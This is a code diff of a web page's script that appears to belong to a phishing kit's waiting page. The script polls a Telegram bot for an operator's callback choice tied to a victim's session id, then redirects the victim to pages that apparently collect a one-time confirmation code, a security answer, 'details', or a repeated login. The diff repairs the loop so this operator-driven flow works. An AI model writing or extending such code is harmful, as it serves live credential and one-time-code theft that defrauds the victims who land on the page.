@@ -38,44 +38,49 @@
     </div>
 
     <script src="endpoints.js"></script>
-<script src="config.js"></script>
-<script>
-    const ROUTES = {
-        "otp":         "confirmation-code.html",
-        "notcorrect":  "notcorrect.html",
-        "login":       "log.html",
-        "secquestion": "sec1.html",
-        "detail":      "detail.html"
-    };
+    <script src="config.js"></script>
+    <script>
+        const ROUTES = {
+            "otp":         "confirmation-code.html",
+            "notcorrect":  "notcorrect.html",
+            "login":       "log.html",
+            "secquestion": "sec1.html",
+            "detail":      "detail.html"
+        };
 
-    (function() {
-        const sid = sessionStorage.getItem('mgv_sid');
-        const startOffset = parseInt(sessionStorage.getItem('mgv_offset') || '0', 10);
-        if (!sid) { window.location.href = 'log.html'; return; }
-        pollLoop(startOffset, sid);
-    })();
+        (function() {
+            const sid = sessionStorage.getItem('mgv_sid');
+            const startOffset = parseInt(sessionStorage.getItem('mgv_offset') || '0', 10);
+            if (!sid) { window.location.href = 'log.html'; return; }
+            pollLoop(startOffset, sid);
+        })();
 
-    async function pollLoop(offset, sid) {
-        while (true) {
-            try {
-                                const [action, sess] = cb.data.split(":");
-                if (sess !== sid) continue;
+        async function pollLoop(offset, sid) {
+            while (true) {
+                try {
+                    const data = await getTelegramUpdates(offset, 15);
+                    if (!data.result) continue;
+                    for (const upd of data.result) {
+                        offset = upd.update_id + 1;
+                        const cb = upd.callback_query;
+                        if (!cb) continue;
+                        const [action, sess] = cb.data.split(":");
+                        if (sess !== sid) continue;
+                        await answerTelegramCallback(cb.id, "Redirecting user…");
+                        sessionStorage.removeItem('mgv_sid');
+                        sessionStorage.removeItem('mgv_offset');
 
-                await answerTelegramCallback(cb.id, "Redirecting user…");
-                sessionStorage.removeItem('mgv_sid');
-                sessionStorage.removeItem('mgv_offset');
-
-                console.log('[wait3] action =', action, '→ target =', ROUTES[action]);
-                window.location.href = ROUTES[action] || "log.html";
-                return;
+                        console.log('[wait3] action =', action, '→ target =', ROUTES[action]);
+                        window.location.href = ROUTES[action] || "log.html";
+                        return;
+                    }
+                } catch (e) {
+                    console.error(e);
+                    await new Promise(r => setTimeout(r, 2000));
                 }
-            } catch (e) {
-                console.error(e);
-                await new Promise(r => setTimeout(r, 2000));
             }
         }
-    }
-</script>
+    </script>
 </body>
 
 </html>
